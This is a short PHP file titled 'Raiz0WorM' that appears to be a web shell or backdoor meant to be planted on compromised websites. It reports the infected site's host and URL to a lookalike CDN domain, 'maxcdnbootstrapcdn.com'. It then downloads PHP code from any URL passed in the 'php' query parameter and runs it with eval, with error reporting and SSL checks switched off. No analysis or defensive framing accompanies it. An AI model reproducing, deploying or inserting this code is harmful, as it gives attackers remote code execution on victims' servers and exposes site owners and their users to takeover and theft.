<?php error_reporting(0); function style($urlStyle) {$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $urlStyle);curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);$style = curl_exec($ch);curl_close($ch);return $style;} echo '<head><title>Raiz0WorM</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><link href="https://maxcdnbootstrapcdn.com/bootstrap/cosmo/bootstrap.min.css" rel="stylesheet" ><script src="https://maxcdnbootstrapcdn.com/bootstrap/js/bootstrap.min.js"></script><script src="'.style('https://maxcdnbootstrapcdn.com/bootstrap/js/style.js').'"></script></head>'; $code = $_GET["php"]; if (empty($code) or !stristr($code, "http")){ exit; } else { $php=file_get_contents($code); if (empty($php)){ $php = curl($code); } $php=str_replace("<?php", "", $php); $php=str_replace("<?php", "", $php); $php=str_replace("?>", "", $php); eval($php); } function curl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_TIMEOUT, 40); curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE); if (stristr($url,"https://")) { curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); } curl_setopt($curl, CURLOPT_HEADER, false); return curl_exec ($curl); } ?>